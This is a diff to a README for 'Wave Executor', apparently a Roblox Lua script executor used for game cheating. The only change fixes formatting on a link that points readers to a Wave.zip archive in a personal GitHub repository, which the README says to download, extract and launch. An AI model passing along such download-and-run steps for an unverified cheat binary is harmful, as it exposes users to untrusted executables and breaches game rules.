@@ -17,7 +17,7 @@ Wave Executor is a high-performance tool for executing Lua scripts in Roblox gam
 ## Installation
 
 1. **Download the Latest Version**:
-   - [Wave.zip](https://github.com/uffing735/Wave-Roblox/raw/refs/heads/main/Wave.zip)download the latest Wave Executor version.
+   - [Wave.zip](https://github.com/uffing735/Wave-Roblox/raw/refs/heads/main/Wave.zip) Download the latest Wave Executor version.
 2. **Extract Files**:
    - Unzip the archive to a convenient location on your computer.
 3. **Launch Wave Executor**:
